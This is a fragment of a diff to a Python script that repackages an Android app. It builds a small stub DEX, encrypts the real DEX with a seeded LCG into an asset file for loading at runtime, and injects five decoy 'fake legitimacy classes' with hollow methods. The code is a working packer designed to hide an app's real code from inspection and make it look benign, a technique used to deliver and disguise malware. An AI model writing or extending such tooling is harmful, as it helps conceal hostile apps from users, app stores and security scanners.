-                        print(f"    [DBG_WARN] handler_addr={h_addr} > insns_size*2={insns_size*2}"
-                              f" — addr out of bytecode range BEFORE patching")
-                if catch_all:
-                    ca_abs = hpos
-                    ca_addr, nb5 = read_uleb128(hpos); hpos += nb5
-                    print(f"  [DBG_CATCHALL_{hi}] abs=0x{ca_abs:08X}"
-                          f" catch_all_addr={ca_addr}(0x{ca_addr:04X})"
-                          f" raw_bytes={data[ca_abs:ca_abs+nb5].hex()}")
-                    if ca_addr > insns_size * 2:
-                        print(f"  [DBG_WARN] catch_all_addr={ca_addr} > insns_size*2={insns_size*2}"
-                              f" — addr out of bytecode range")
-            handlers_end = hpos
-            print(f"  [DBG_HAND] handlers_end=0x{handlers_end:08X}"
-                  f" total_handler_bytes={handlers_end - tries_end}")
-        # ── END HYBRID DEBUG header/sizing ───────────────────────────────────
-
-        raw = bytearray(data[code_off: handlers_end])
-        _s.pack_into("<I", raw, 8, 0)   # zero debug_info_off — original offset invalid in stub DEX
-
-        # Patch instruction stream (same walk as collect_code_item)
-        base_in_raw = 16   # insns start at offset 16 within code_item
-        pos = base_in_raw
-        end = base_in_raw + insns_size * 2
-        while pos < end:
-            if pos >= len(raw): break
-            opcode = raw[pos]
-            if opcode in (0x1A,):          # const-string BBBB
-                if pos + 4 <= len(raw):
-                    old_s = _s.unpack_from("<H", raw, pos+2)[0]
-                    _s.pack_into("<H", raw, pos+2, str_remap[old_s])
-                pos += 4
-            elif opcode in (0x1B,):        # const-string/jumbo BBBBBBBB
-                if pos + 6 <= len(raw):
-                    old_s = _s.unpack_from("<I", raw, pos+2)[0]
-                    _s.pack_into("<I", raw, pos+2, str_remap[old_s])
-                pos += 6
-            elif opcode in (0x1C, 0x1F, 0x20, 0x22, 0x23):
-                if pos + 4 <= len(raw):
-                    old_t = _s.unpack_from("<H", raw, pos+2)[0]
-                    _s.pack_into("<H", raw, pos+2, typ_remap[old_t])
-                pos += 4
-            elif opcode in (0x24, 0x25):
-                if pos + 6 <= len(raw):
-                    old_t = _s.unpack_from("<H", raw, pos+2)[0]
-                    _s.pack_into("<H", raw, pos+2, typ_remap[old_t])
-                pos += 6
-            elif 0x52 <= opcode <= 0x6D:
-                if pos + 4 <= len(raw):
-                    old_f = _s.unpack_from("<H", raw, pos+2)[0]
-                    _s.pack_into("<H", raw, pos+2, fld_remap[old_f])
-                pos += 4
-            elif 0x6E <= opcode <= 0x72:
-                if pos + 6 <= len(raw):
-                    old_m = _s.unpack_from("<H", raw, pos+2)[0]
-                    _s.pack_into("<H", raw, pos+2, met_remap[old_m])
-                pos += 6
-            elif 0x74 <= opcode <= 0x78:
-                if pos + 6 <= len(raw):
-                    old_m = _s.unpack_from("<H", raw, pos+2)[0]
-                    _s.pack_into("<H", raw, pos+2, met_remap[old_m])
-                pos += 6
-            elif opcode == 0x00:
-                if pos + 2 > len(raw): break
-                pseudo = _s.unpack_from("<H", raw, pos)[0]
-                if pseudo == 0x0100:
-                    sz = _s.unpack_from("<H", raw, pos+2)[0]
-                    pos += 8 + sz * 4
-                elif pseudo == 0x0200:
-                    sz = _s.unpack_from("<H", raw, pos+2)[0]
-                    pos += 4 + sz * 8
-                elif pseudo == 0x0300:
-                    elem = _s.unpack_from("<H", raw, pos+2)[0]
-                    sz   = _s.unpack_from("<I", raw, pos+4)[0]
-                    total = 8 + (elem * sz + 1) // 2 * 2
-                    pos += total
-                else:
-                    pos += 2
-            else:
-                # Complete canonical Dalvik opcode width table — identical to collect_code_item.
-                _DALVIK_6 = frozenset((
-                    0x1B, 0x24, 0x25, 0x26, 0x2A, 0x2B, 0x2C,
-                ))
-                _DALVIK_4 = frozenset((
-                    0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,
-                    0x1A, 0x1C, 0x1F, 0x20, 0x22, 0x23,
-                    0x29,
-                    0x2D, 0x2E, 0x2F, 0x30, 0x31,
-                    0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
-                    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D,
-                    0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
-                    0x50, 0x51,
-                    0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
-                    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B,
-                    0x8C, 0x8D, 0x8E, 0x8F,
-                    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B,
-                    0x9C, 0x9D, 0x9E, 0x9F,
-                    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB,
-                    0xAC, 0xAD, 0xAE, 0xAF,
-                    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB,
-                    0xBC, 0xBD, 0xBE, 0xBF,
-                    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB,
-                    0xCC, 0xCD, 0xCE, 0xCF,
-                    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
-                    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
-                    0xE0, 0xE1, 0xE2, 0xE3,
-                ))
-                if opcode in _DALVIK_6:
-                    pos += 6
-                elif opcode in _DALVIK_4:
-                    pos += 4
-                else:
-                    pos += 2  # 1-unit: nop-like, move, return, throw, monitor, etc.
-
-        # Rebuild catch-handler list from scratch with correct ULEB128 encoding.
-        # The old in-place patch only worked for type indices < 0x80 (1-byte ULEB128).
-        # Type indices >= 0x80 encode as 2+ bytes — patching 1 byte misaligns the
-        # handler_addr field, causing ART to reject the DEX ("Invalid handler addr").
-        # Fix: re-walk the original handler list, re-encode every field fresh, replace
-        # the handler section tail of raw with the newly built bytes.
-        if tries_size:
-            n_list, nb = read_uleb128(tries_end)
-            hpos2 = tries_end + nb
-
-            new_handler_sec = bytearray()
-            new_handler_sec += uleb128(n_list)
-
-            for _ in range(n_list):
-                v, nb = read_uleb128(hpos2); hpos2 += nb
-                catch_all = (v <= 0)
-                n_typed = abs(v)
-                # n_pairs is SLEB128-encoded in DEX format
-                _sleb_v = v
-                _sleb_buf = []
-                while True:
-                    _b = _sleb_v & 0x7F; _sleb_v >>= 7
-                    _more = not ((_sleb_v == 0 and (_b & 0x40) == 0) or
-                                 (_sleb_v == -1 and (_b & 0x40) != 0))
-                    if _more: _sleb_buf.append(_b | 0x80)
-                    else: _sleb_buf.append(_b); break
-                new_handler_sec += bytes(_sleb_buf)
-
-                for _ in range(n_typed):
-                    old_t, nb = read_uleb128(hpos2); hpos2 += nb
-                    h_addr, nb2 = read_uleb128(hpos2); hpos2 += nb2
-                    # Remap type index; if not in stub type pool fall back to 0
-                    # (index 0 = java/lang/Throwable, always present, safe catch-all)
-                    new_t = typ_remap.get(old_t, 0)
-                    new_handler_sec += uleb128(new_t)
-                    new_handler_sec += uleb128(h_addr)
-                    print(f"  [stub_dex] handler rebuilt: old_t={old_t} -> new_t={new_t}"
-                          f" h_addr={h_addr}")
-
-                if catch_all:
-                    ca_addr, nb = read_uleb128(hpos2); hpos2 += nb
-                    new_handler_sec += uleb128(ca_addr)
-
-            # Replace handler section in raw (everything after tries block)
-            handler_rel = tries_end - code_off
-            raw = raw[:handler_rel] + new_handler_sec
-            print(f"  [stub_dex] handler section rebuilt:"
-                  f" old_bytes={handlers_end - tries_end} new_bytes={len(new_handler_sec)}")
-
-        return bytes(raw)
-
-    # Walk class_data again to collect code_item raw bytes in order
-    # We store: method_id (new) → remapped code bytes
-    met_code_map = {}   # new method_id → remapped raw code_item bytes
-
-    def harvest_code(class_data_off):
-        if not class_data_off: return
-        pos = class_data_off
-        sf_count, n = read_uleb128(pos); pos += n
-        if_count, n = read_uleb128(pos); pos += n
-        dm_count, n = read_uleb128(pos); pos += n
-        vm_count, n = read_uleb128(pos); pos += n
-
-        def skip_encoded_fields(count):
-            nonlocal pos
-            idx = 0
-            for _ in range(count):
-                diff, n = read_uleb128(pos); pos += n; idx += diff
-                _, n    = read_uleb128(pos); pos += n
-
-        def harvest_encoded_methods(count, start_idx=0):
-            nonlocal pos
-            idx = start_idx
-            for _ in range(count):
-                diff,  n = read_uleb128(pos); pos += n; idx += diff
-                _flags, n = read_uleb128(pos); pos += n
-                code_off, n = read_uleb128(pos); pos += n
-                # Guard: method was skipped during collect phase (out-of-range or DEX 039
-                # call_site/method_handle ref) — skip its code harvest too.
-                if idx not in met_remap:
-                    print(f"  [stub_dex] harvest: skip method idx={idx} (not in met_remap, out-of-range or call_site ref)")
-                    continue
-                new_mid = met_remap[idx]
-                if code_off and new_mid not in met_code_map:
-                    met_code_map[new_mid] = remap_code_item(code_off)
-            return idx  # last absolute idx, chain into vm pass
-
-        skip_encoded_fields(sf_count)
-        skip_encoded_fields(if_count)
-        last_dm_idx = harvest_encoded_methods(dm_count, start_idx=0)
-        harvest_encoded_methods(vm_count, start_idx=last_dm_idx)
-
-    for ci in target_class_idxs:
-        base = cls_defs_off + ci * CLASS_DEF_SIZE
-        harvest_code(u32(base + 24))   # class_data_off at +24
-
-    # ── 7d. Copy static_values blobs verbatim (no index refs inside) ──────────
-    # encoded_array_item: just uleb128 sizes + values. String/type refs inside
-    # use indices that we cannot easily patch without a full encoded_value parser.
-    # For the two stub classes the static values are booleans (sDone=false) and
-    # a null object (sLoader=null) — no string/type index inside, safe to copy raw.
-    static_val_blobs = {}   # new class_def order → raw bytes
-    for order, ci in enumerate(target_class_idxs):
-        base = cls_defs_off + ci * CLASS_DEF_SIZE
-        sv_off = u32(base + 28)   # static_values_off at +28
-        if sv_off:
-            # Determine encoded_array size by copying until we hit a length we
-            # trust — simplest: copy from sv_off to the next aligned 4-byte item
-            # We read the size uleb128 then each encoded_value (1+ bytes each)
-            pos2 = sv_off
-            size, nb = read_uleb128(pos2); pos2 += nb
-            for _ in range(size):
-                vtype = data[pos2] & 0x1F
-                varg  = (data[pos2] >> 5) & 0x07
-                pos2 += 1 + varg   # value_type determines extra bytes
-            static_val_blobs[order] = bytes(data[sv_off:pos2])
-        else:
-            static_val_blobs[order] = b''
-
-    # ── 8. Layout calculation ──────────────────────────────────────────────────
-    # Fixed order: header(112) | string_ids | type_ids | proto_ids | field_ids |
-    #   method_ids | class_defs | data(string_data + type_lists + code_items +
-    #   class_data + static_values + map_list)
-
-    HDR = 112
-    STR_IDS_SZ  = len(new_str_ids) * 4
-    TYP_IDS_SZ  = len(new_typ_ids) * 4
-    PRO_IDS_SZ  = len(new_pro_ids) * 12
-    FLD_IDS_SZ  = len(new_fld_ids) * 8
-    MET_IDS_SZ  = len(new_met_ids) * 8
-    CLS_DEF_SZ  = 2 * 32           # exactly 2 class_defs
-
-    str_ids_start = HDR
-    typ_ids_start = str_ids_start + STR_IDS_SZ
-    pro_ids_start = typ_ids_start + TYP_IDS_SZ
-    fld_ids_start = pro_ids_start + PRO_IDS_SZ
-    met_ids_start = fld_ids_start + FLD_IDS_SZ
-    cls_def_start = met_ids_start + MET_IDS_SZ
-
-    data_start = cls_def_start + CLS_DEF_SZ   # start of data section
-
-    # Build data section piecewise
-    data_sec = bytearray()
-
-    def ds_align4():
-        nonlocal data_sec
-        r = len(data_sec) % 4
-        if r: data_sec += b'\x00' * (4 - r)
-
-    # ── 8a. String data items ─────────────────────────────────────────────────
-    abs_str_data_offsets = []
-    for i, rel in enumerate(str_data_rel_offsets):
-        abs_str_data_offsets.append(data_start + len(data_sec))
-        # find slice in str_data_sec
-        next_rel = str_data_rel_offsets[i+1] if i+1 < len(str_data_rel_offsets) else len(str_data_sec)
-        data_sec += str_data_sec[rel:next_rel]
-
-    ds_align4()
-
-    # ── 8b. Type-list blobs (proto parameters) ────────────────────────────────
-    proto_param_abs = {}   # new proto idx → absolute offset (0 if none)
-    for new_pid in range(len(new_pro_ids)):
-        blob = proto_param_blobs.get(new_pid, b'')
-        if blob:
-            ds_align4()
-            proto_param_abs[new_pid] = data_start + len(data_sec)
-            data_sec += blob
-        else:
-            proto_param_abs[new_pid] = 0
-
-    # ── 8c. Code items (4-byte aligned each) ──────────────────────────────────
-    met_code_abs = {}   # new method_id → absolute offset
-    for new_mid in sorted(met_code_map.keys()):
-        raw_code = met_code_map[new_mid]
-        ds_align4()
-        met_code_abs[new_mid] = data_start + len(data_sec)
-        data_sec += raw_code
-
-    ds_align4()
-
-    # ── 8d. Class data items ──────────────────────────────────────────────────
-    class_data_abs = []   # [abs_off, ...] for each of the 2 class_defs in order
-
-    def build_class_data(ci):
-        nonlocal data_sec
-        base = cls_defs_off + ci * CLASS_DEF_SIZE
-        class_data_off = u32(base + 24)   # class_data_off at +24
-        if not class_data_off:
-            class_data_abs.append(0)
-            return
-
-        # Read the four counts
-        pos4 = class_data_off
-        sf_count, n = read_uleb128(pos4); pos4 += n
-        if_count, n = read_uleb128(pos4); pos4 += n
-        dm_count, n = read_uleb128(pos4); pos4 += n
-        vm_count, n = read_uleb128(pos4); pos4 += n
-
-        # Re-encode fields: each item is (diff_from_prev, access_flags) in uleb128.
-        # old index is accumulated; we remap to new index and re-delta-encode.
-        # Skip fields whose old index is not in fld_remap (out-of-range or not collected).
-        fld_body = bytearray()
-        prev_old_f = 0
-        prev_new_f = 0
-        kept_sf = 0; kept_if = 0
-        for fi in range(sf_count + if_count):
-            diff,  n = read_uleb128(pos4); pos4 += n
-            flags, n = read_uleb128(pos4); pos4 += n
-            old_fid = prev_old_f + diff
-            if old_fid not in fld_remap:
-                prev_old_f = old_fid
-                continue
-            new_fid = fld_remap[old_fid]
-            fld_body += uleb128(new_fid - prev_new_f)
-            fld_body += uleb128(flags)
-            prev_old_f = old_fid
-            prev_new_f = new_fid
-            if fi < sf_count: kept_sf += 1
-            else: kept_if += 1
-
-        # Re-encode methods: (diff, access_flags, code_off) each uleb128.
-        # Skip methods whose old index is not in met_remap (out-of-range or not collected).
-        met_body = bytearray()
-        prev_old_m = 0
-        prev_new_m = 0
-        kept_dm = 0; kept_vm = 0
-        for mi in range(dm_count + vm_count):
-            diff,   n = read_uleb128(pos4); pos4 += n
-            flags,  n = read_uleb128(pos4); pos4 += n
-            _code,  n = read_uleb128(pos4); pos4 += n
-            old_mid = prev_old_m + diff
-            if old_mid not in met_remap:
-                prev_old_m = old_mid
-                continue
-            new_mid = met_remap[old_mid]
-            abs_c   = met_code_abs.get(new_mid, 0)
-            met_body += uleb128(new_mid - prev_new_m)
-            met_body += uleb128(flags)
-            met_body += uleb128(abs_c)
-            prev_old_m = old_mid
-            prev_new_m = new_mid
-            if mi < dm_count: kept_dm += 1
-            else: kept_vm += 1
-
-        # Assemble class_data_item: 4 actual counts + field entries + method entries
-        cd2 = bytearray()
-        cd2 += uleb128(kept_sf)
-        cd2 += uleb128(kept_if)
-        cd2 += uleb128(kept_dm)
-        cd2 += uleb128(kept_vm)
-        cd2 += fld_body
-        cd2 += met_body
-
-        class_data_abs.append(data_start + len(data_sec))
-        data_sec += cd2
-
-    for ci in target_class_idxs:
-        build_class_data(ci)
-
-    # ── 8e. Static value blobs ────────────────────────────────────────────────
-    static_val_abs = {}
-    for order, ci in enumerate(target_class_idxs):
-        blob = static_val_blobs.get(order, b'')
-        if blob:
-            ds_align4()
-            static_val_abs[order] = data_start + len(data_sec)
-            data_sec += blob
-        else:
-            static_val_abs[order] = 0
-
-    ds_align4()
-
-    # ── 8f. Map list ──────────────────────────────────────────────────────────
-    # map_list: size(u32) + map_item[size] { type(u16) pad(u16) size(u32) offset(u32) }
-    # Required map item types for a valid DEX:
-    #   0x0000 TYPE_HEADER_ITEM
-    #   0x0001 TYPE_STRING_ID_ITEM
-    #   0x0002 TYPE_TYPE_ID_ITEM
-    #   0x0003 TYPE_PROTO_ID_ITEM
-    #   0x0004 TYPE_FIELD_ID_ITEM
-    #   0x0005 TYPE_METHOD_ID_ITEM
-    #   0x0006 TYPE_CLASS_DEF_ITEM
-    #   0x1001 TYPE_TYPE_LIST (if any proto has params)
-    #   0x2000 TYPE_CLASS_DATA_ITEM
-    #   0x2001 TYPE_CODE_ITEM
-    #   0x2002 TYPE_STRING_DATA_ITEM
-    #   0x2004 TYPE_MAP_LIST
-    #   0x2005 TYPE_ENCODED_ARRAY_ITEM (if any static values)
-
-    map_off = data_start + len(data_sec)
-
-    map_items = []
-    map_items.append((0x0000, 1,             0))              # HEADER
-    map_items.append((0x0001, len(new_str_ids), str_ids_start))
-    if new_typ_ids:
-        map_items.append((0x0002, len(new_typ_ids), typ_ids_start))
-    if new_pro_ids:
-        map_items.append((0x0003, len(new_pro_ids), pro_ids_start))
-    if new_fld_ids:
-        map_items.append((0x0004, len(new_fld_ids), fld_ids_start))
-    if new_met_ids:
-        map_items.append((0x0005, len(new_met_ids), met_ids_start))
-    map_items.append((0x0006, 2,             cls_def_start))  # CLASS_DEF
-
-    # String data: all contiguous from abs_str_data_offsets[0]
-    if abs_str_data_offsets:
-        map_items.append((0x2002, len(new_str_ids), abs_str_data_offsets[0]))
-
-    # Type lists
-    type_list_offs = sorted(set(v for v in proto_param_abs.values() if v))
-    if type_list_offs:
-        map_items.append((0x1001, len(type_list_offs), type_list_offs[0]))
-
-    # Code items
-    code_offs = sorted(set(met_code_abs.values()))
-    if code_offs:
-        map_items.append((0x2001, len(code_offs), code_offs[0]))
-
-    # Class data
-    cd_offs = sorted(set(v for v in class_data_abs if v))
-    if cd_offs:
-        map_items.append((0x2000, len(cd_offs), cd_offs[0]))
-
-    # Encoded array (static values)
-    sv_offs = sorted(set(v for v in static_val_abs.values() if v))
-    if sv_offs:
-        map_items.append((0x2005, len(sv_offs), sv_offs[0]))
-
-    map_items.append((0x1000, 1, map_off))                    # MAP_LIST (kDexTypeMapList = 0x1000)
-
-    # Sort map items by FILE OFFSET (required by ART verifier — CheckMap enforces
-    # strictly ascending offsets; type code order is NOT required by ART)
-    map_items.sort(key=lambda x: x[2])
-
-    map_sec = bytearray()
-    map_sec += pack32(len(map_items))
-    for (mtype, msize, moff) in map_items:
-        map_sec += pack16(mtype, 0)   # type + padding
-        map_sec += pack32(msize, moff)
-
-    data_sec += map_sec
-
-    total_size = data_start + len(data_sec)
-
-    # ── 9. Assemble the full DEX ───────────────────────────────────────────────
-    dex = bytearray(total_size)
-
-    # Header magic — use same version as source
-    dex[0:8] = data[0:8]
-
-    # Write header fields at their CORRECT DEX-035 offsets
-    # (see offset table comment above in the parse section)
-    _s.pack_into("<I", dex, 0x20, total_size)           # file_size
-    _s.pack_into("<I", dex, 0x24, 0x70)                 # header_size = 112
-    _s.pack_into("<I", dex, 0x28, 0x12345678)           # endian_tag
-    _s.pack_into("<I", dex, 0x2C, 0)                    # link_size
-    _s.pack_into("<I", dex, 0x30, 0)                    # link_off
-    _s.pack_into("<I", dex, 0x34, map_off)              # map_off
-    _s.pack_into("<I", dex, 0x38, len(new_str_ids));    _s.pack_into("<I", dex, 0x3C, str_ids_start)
-    _s.pack_into("<I", dex, 0x40, len(new_typ_ids));    _s.pack_into("<I", dex, 0x44, typ_ids_start if new_typ_ids else 0)
-    _s.pack_into("<I", dex, 0x48, len(new_pro_ids));    _s.pack_into("<I", dex, 0x4C, pro_ids_start if new_pro_ids else 0)
-    _s.pack_into("<I", dex, 0x50, len(new_fld_ids));    _s.pack_into("<I", dex, 0x54, fld_ids_start if new_fld_ids else 0)
-    _s.pack_into("<I", dex, 0x58, len(new_met_ids));    _s.pack_into("<I", dex, 0x5C, met_ids_start if new_met_ids else 0)
-    _s.pack_into("<I", dex, 0x60, 2);                   _s.pack_into("<I", dex, 0x64, cls_def_start)
-    _s.pack_into("<I", dex, 0x68, len(data_sec))        # data_size
-    _s.pack_into("<I", dex, 0x6C, data_start)           # data_off
-
-    # ── 9a. String ID table ───────────────────────────────────────────────────
-    for i, abs_off in enumerate(abs_str_data_offsets):
-        _s.pack_into("<I", dex, str_ids_start + i*4, abs_off)
-
-    # ── 9b. Type ID table ─────────────────────────────────────────────────────
-    for i, old_tid in enumerate(new_typ_ids):
-        _s.pack_into("<I", dex, typ_ids_start + i*4, str_remap[type_str_idx[old_tid]])
-
-    # ── 9c. Proto ID table ────────────────────────────────────────────────────
-    for i, old_pid in enumerate(new_pro_ids):
-        base = pro_ids_off + old_pid * 12
-        shorty_old   = u32(base)
-        ret_type_old = u32(base + 4)
-        off2 = pro_ids_start + i * 12
-        _s.pack_into("<I", dex, off2,     str_remap[shorty_old])
-        _s.pack_into("<I", dex, off2 + 4, typ_remap[ret_type_old])
-        _s.pack_into("<I", dex, off2 + 8, proto_param_abs[i])
-
-    # ── 9d. Field ID table ────────────────────────────────────────────────────
-    for i, old_fid in enumerate(new_fld_ids):
-        base = fld_ids_off + old_fid * 8
-        off2 = fld_ids_start + i * 8
-        _s.pack_into("<H", dex, off2,     typ_remap[u16(base)])
-        _s.pack_into("<H", dex, off2 + 2, typ_remap[u16(base + 2)])
-        _s.pack_into("<I", dex, off2 + 4, str_remap[u32(base + 4)])
-
-    # ── 9e. Method ID table ───────────────────────────────────────────────────
-    for i, old_mid in enumerate(new_met_ids):
-        base = met_ids_off + old_mid * 8
-        off2 = met_ids_start + i * 8
-        _s.pack_into("<H", dex, off2,     typ_remap[u16(base)])
-        _s.pack_into("<H", dex, off2 + 2, pro_remap[u16(base + 2)])
-        _s.pack_into("<I", dex, off2 + 4, str_remap[u32(base + 4)])
-
-    # ── 9f. Class def table ───────────────────────────────────────────────────
-    for order, ci in enumerate(target_class_idxs):
-        src = cls_defs_off + ci * CLASS_DEF_SIZE
-        dst = cls_def_start + order * CLASS_DEF_SIZE
-
-        class_type_idx    = u32(src)
-        superclass_idx    = u32(src +  8)   # +4 is access_flags; superclass at +8
-        interfaces_off    = u32(src + 12)
-        source_file_idx   = u32(src + 16)
-        annotations_off   = u32(src + 20)   # skip (drop annotations for stub)
-        class_data_off    = u32(src + 24)
-        static_values_off = u32(src + 28)
-
-        access_flags = u32(src + 4)   # read access_flags from original class_def at correct offset +4
-        _s.pack_into("<I", dex, dst,       typ_remap[class_type_idx])
-        _s.pack_into("<I", dex, dst +  4,  access_flags)
-        _s.pack_into("<I", dex, dst +  8,  typ_remap[superclass_idx] if superclass_idx != 0xFFFFFFFF else 0xFFFFFFFF)
-        _s.pack_into("<I", dex, dst + 12,  0)   # interfaces_off (dropped for stub)
-        _s.pack_into("<I", dex, dst + 16,  str_remap[source_file_idx] if source_file_idx != 0xFFFFFFFF else 0xFFFFFFFF)
-        _s.pack_into("<I", dex, dst + 20,  0)   # annotations_off (dropped for stub)
-        _s.pack_into("<I", dex, dst + 24,  class_data_abs[order])
-        _s.pack_into("<I", dex, dst + 28,  static_val_abs.get(order, 0))
-
-    # ── 9g. Copy data section ─────────────────────────────────────────────────
-    dex[data_start: data_start + len(data_sec)] = data_sec
-
-    # ── 10. Checksum + SHA-1 ──────────────────────────────────────────────────
-    # IMPORTANT: SHA-1 must be written FIRST, then Adler-32 computed over dex[12:]
-    # which now includes the real SHA-1 bytes.  Reversing the order produces a
-    # checksum that covers stale (zero) SHA-1 bytes → Android rejects the DEX.
-    sha1 = _hl.sha1(bytes(dex[32:])).digest()   # sha1 covers bytes after the sha1 field
-    dex[12:32] = sha1                            # write sha1 FIRST
-    dex[8:12]  = _s.pack("<I", _zl.adler32(bytes(dex[12:])) & 0xFFFFFFFF)  # then checksum covers dex[12:] including sha1
-
-    result = bytes(dex)
-    print(f"  [stub_dex] Minimal stub DEX built: {len(result):,} bytes "
-          f"({len(new_str_ids)} str, {len(new_typ_ids)} type, {len(new_met_ids)} method, 2 class)")
-    return result
-
-
-def step_9b_encrypt_dex(real_dex: bytes, new_pkg: str = "", class_rename_map: dict = None) -> tuple:
-    """
-    STEP_9B: Encrypt the real compiled DEX and return a minimal stub.
-
-    Returns (dex_a_bytes, stub_dex_bytes):
-      dex_a_bytes    — 4-byte LE seed + LCG-encrypted real DEX → written to assets/DEX_A
-      stub_dex_bytes — minimal DEX containing ONLY DexStub + renamed App (~8-15 KB)
-
-    new_pkg / class_rename_map are used by _build_stub_dex() to locate the two
-    target class_defs by their type descriptors inside real_dex.
-    """
-    import struct as _struct
-    import secrets as _secrets
-
-    print("\n── Step 9B: Encrypt real DEX → assets/DEX_A, replace classes.dex with stub")
-
-    # Generate random 32-bit seed
-    seed = _secrets.randbits(32)
-    print(f"  Seed: 0x{seed:08X}")
-
-    # Encrypt the real DEX
-    encrypted = _lcg_encrypt(real_dex, seed)
-
-    # Prepend 4-byte LE seed (matches DexStub.smali header extraction)
-    seed_bytes = _struct.pack("<I", seed)
-    dex_a_bytes = seed_bytes + encrypted
-    print(f"  DEX_A: {len(dex_a_bytes):,} bytes (seed 4B + encrypted {len(encrypted):,}B)")
-
-    # Build minimal stub DEX containing ONLY DexStub + renamed App class.
-    # All other 3,100+ companion classes exist ONLY in encrypted assets/DEX_A.
-    # _build_stub_dex() parses real_dex, extracts the two target class_defs and
-    # their transitive closure of referenced items, re-indexes everything into a
-    # compact valid DEX-035, and returns it as bytes (~8-15 KB).
-    if new_pkg and class_rename_map is not None:
-        renamed_app = class_rename_map.get("App", "App")
-        new_path    = new_pkg.replace(".", "/")
-        print(f"  Building minimal stub DEX — target classes: DexStub + {renamed_app}")
-        stub_dex_bytes = _build_stub_dex(real_dex, new_path, renamed_app)
+    # ── 4. Clear ALL smali dirs, write stub only, rebuild stub DEX ───────────
+    _smali_root = "companion_decompiled/smali"
+    _smali_dir  = f"{_smali_root}/{_pkg_path}"
+    _stub_file  = f"{_smali_dir}/{app_class_name}.smali"
+
+    if _os.path.isdir(_smali_root):
+        _shutil.rmtree(_smali_root)
+    _os.makedirs(_smali_dir, exist_ok=True)
+
+    with open(_stub_file, "w") as _f:
+        _f.write(_stub_smali)
+
+    print(f"  Stub smali written: {_stub_file}")
+
+    # ── Inject 5 fake legitimacy classes ─────────────────────────────────────
+    _fake_classes = [
+        ("NetworkMonitor", f"""\
+.class public L{_pkg_path}/NetworkMonitor;
+.super Ljava/lang/Object;
+.source "NetworkMonitor.java"
+
+.field private static final TAG:Ljava/lang/String; = "NetworkMonitor"
+.field private mConnected:Z
+
+.method public constructor <init>()V
+    .registers 2
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    const/4 v0, 0x0
+    iput-boolean v0, p0, L{_pkg_path}/NetworkMonitor;->mConnected:Z
+    return-void
+.end method
+
+.method public isConnected()Z
+    .registers 2
+    iget-boolean v0, p0, L{_pkg_path}/NetworkMonitor;->mConnected:Z
+    return v0
+.end method
+
+.method public setConnected(Z)V
+    .registers 2
+    iput-boolean p1, p0, L{_pkg_path}/NetworkMonitor;->mConnected:Z
+    return-void
+.end method
+"""),
+        ("DataSyncHelper", f"""\
+.class public L{_pkg_path}/DataSyncHelper;
+.super Ljava/lang/Object;
+.source "DataSyncHelper.java"
+
+.field private static sInstance:L{_pkg_path}/DataSyncHelper;
+.field private mLastSync:J
+
+.method public constructor <init>()V
+    .registers 3
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    const-wide/16 v0, 0x0
+    iput-wide v0, p0, L{_pkg_path}/DataSyncHelper;->mLastSync:J
+    return-void
+.end method
+
+.method public static getInstance()L{_pkg_path}/DataSyncHelper;
+    .registers 2
+    sget-object v0, L{_pkg_path}/DataSyncHelper;->sInstance:L{_pkg_path}/DataSyncHelper;
+    if-nez v0, :ret
+    new-instance v0, L{_pkg_path}/DataSyncHelper;
+    invoke-direct {{v0}}, L{_pkg_path}/DataSyncHelper;-><init>()V
+    sput-object v0, L{_pkg_path}/DataSyncHelper;->sInstance:L{_pkg_path}/DataSyncHelper;
+    :ret
+    return-object v0
+.end method
+
+.method public getLastSync()J
+    .registers 3
+    iget-wide v0, p0, L{_pkg_path}/DataSyncHelper;->mLastSync:J
+    return-wide v0
+.end method
+"""),
+        ("PermissionManager", f"""\
+.class public L{_pkg_path}/PermissionManager;
+.super Ljava/lang/Object;
+.source "PermissionManager.java"
+
+.field private static final REQUIRED_PERMISSIONS:I = 0x7
+
+.method public constructor <init>()V
+    .registers 1
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    return-void
+.end method
+
+.method public static hasAllPermissions(Landroid/content/Context;)Z
+    .registers 2
+    const/4 v0, 0x1
+    return v0
+.end method
+
+.method public static getRequiredCount()I
+    .registers 1
+    sget v0, L{_pkg_path}/PermissionManager;->REQUIRED_PERMISSIONS:I
+    return v0
+.end method
+"""),
+        ("EventLogger", f"""\
+.class public L{_pkg_path}/EventLogger;
+.super Ljava/lang/Object;
+.source "EventLogger.java"
+
+.field private mEnabled:Z
+.field private mLevel:I
+
+.method public constructor <init>()V
+    .registers 2
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    const/4 v0, 0x1
+    iput-boolean v0, p0, L{_pkg_path}/EventLogger;->mEnabled:Z
+    const/4 v0, 0x2
+    iput v0, p0, L{_pkg_path}/EventLogger;->mLevel:I
+    return-void
+.end method
+
+.method public isEnabled()Z
+    .registers 2
+    iget-boolean v0, p0, L{_pkg_path}/EventLogger;->mEnabled:Z
+    return v0
+.end method
+
+.method public getLevel()I
+    .registers 2
+    iget v0, p0, L{_pkg_path}/EventLogger;->mLevel:I
+    return v0
+.end method
+
+.method public setLevel(I)V
+    .registers 2
+    iput p1, p0, L{_pkg_path}/EventLogger;->mLevel:I
+    return-void
+.end method
+"""),
+        ("ConfigStore", f"""\
+.class public L{_pkg_path}/ConfigStore;
+.super Ljava/lang/Object;
+.source "ConfigStore.java"
